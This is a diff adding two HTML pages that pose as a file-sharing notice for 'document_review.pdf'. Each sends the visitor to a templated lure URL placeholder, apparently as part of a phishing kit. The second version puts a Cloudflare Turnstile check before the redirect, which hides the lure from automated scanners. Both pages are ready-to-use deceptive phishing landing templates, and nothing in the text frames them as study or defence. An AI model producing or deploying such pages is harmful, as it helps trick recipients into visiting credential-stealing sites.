@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Shared a file with you (1)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: top center;
+            background-attachment: fixed;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.3);
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        @keyframes zoomIn {
+            from {
+                transform: translate(-50%, -50%) scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .card-zoom {
+            animation: zoomIn 0.4s ease-out;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center relative">
+    <!-- Logo -->
+    <div class="left-1/2 transform -translate-x-1/2 absolute" style="top: 80px;">
+        <img src="logo.png" alt="Logo" class="h-20 ">
+    </div>
+
+    <!-- Main Card -->
+    <div class="rounded-2xl max-w-sm md:max-w-md shadow-2xl p-5 max-w-90 w-full mx-4 transform -translate-x-1/2 -translate-y-1/2 absolute top-1/2 left-1/2 card-zoom mt-10"  style="margin: 0; padding: 40px 30px; background: linear-gradient(to top, white, white);">
+        <div class="text-center">
+            <!-- Document Info -->
+            <div class="mb-8">
+                <img src="doc.png" alt="Document" class="h-16 mx-auto mb-4">
+                <p class="text-xl font-semibold" style="word-wrap: break-word;">
+                    <span class="text-blue-800 underline decoration-dotted hover:text-blue-600 hover:decoration-solid transition-colors cursor-pointer">document_review.pdf</span>
+                </p>
+                <p class="text-sm text-gray-600">
+                    has been shared with you
+                </p>
+                <p class="text-xs text-gray-500 mt-5">
+                    8 hours ago
+                </p>
+            </div>
+
+            <!-- Download Button -->
+            <div class="border-t border-gray-200 pt-6 mt-6">
+                <div class="download flex justify-center">
+                    <button type="button" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition duration-200 transform hover:scale-105 shadow-lg flex items-center justify-center gap-2" onclick="clickedDownload()">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                        </svg>
+                        View Document
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function clickedDownload() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Shared a file with you (1)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    
+    <style>
+        body {
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: top center;
+            background-attachment: fixed;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.3);
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        @keyframes zoomIn {
+            from {
+                transform: translate(-50%, -50%) scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .card-zoom {
+            animation: zoomIn 0.4s ease-out;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center relative">
+    <!-- Logo -->
+    <div class="left-1/2 transform -translate-x-1/2 absolute" style="top: 70px;">
+        <img src="logo.png" alt="Logo" class="h-20 ">
+    </div>
+
+    <!-- Main Card -->
+    <div class="rounded-2xl max-w-sm md:max-w-md shadow-2xl p-5 max-w-90 w-full mx-4 transform -translate-x-1/2 -translate-y-1/2 absolute top-1/2 left-1/2 card-zoom mt-10"  style="margin: 0; padding: 40px 30px; background: linear-gradient(to top, white, white);">
+        <div class="text-center">
+            <!-- Document Info -->
+            <div class="mb-8">
+                <img src="doc.png" alt="Document" class="h-16 mx-auto mb-4">
+                <p class="text-xl font-semibold" style="word-wrap: break-word;">
+                    <span class="text-blue-800 underline decoration-dotted hover:text-blue-600 hover:decoration-solid transition-colors cursor-pointer">document_review.pdf</span>
+                </p>
+                <p class="text-sm text-gray-600">
+                    has been shared with you
+                </p>
+                <p class="text-xs text-gray-500 mt-5">
+                    8 hours ago
+                </p>
+            </div>
+
+            <div class="border-t border-gray-200 pt-6 mt-6">
+             
+                 <div class="download flex flex-col items-center gap-3">
+    <button
+        type="button"
+        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition duration-200 transform hover:scale-105 shadow-lg flex items-center justify-center gap-2"
+       
+    >
+       <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                        </svg>
+
+        Authenticating...
+    </button>
+
+ <!--    <p class="text-sm text-gray-700 mt-4">
+        If you are not automatically redirected,
+        <span
+            class="text-blue-700 underline font-bold px-1 rounded cursor-pointer"
+            onclick="clickedDownload()"
+        >
+            click here
+        </span>
+    </p> -->
+    <div id="cf-turnstile"></div>
+
+<script>
+turnstile.ready(function () {
+        turnstile.render('#cf-turnstile', {
+            sitekey: '0x4AAAAAACXRP8wxxBAwoG3l', // replace this with your own sitekey
+            callback: function(token) {
+                window.location.assign({lure_url_js});
+            },
+        });
+    });
+</script>
+</div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function clickedDownload() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+</body>
+</html>
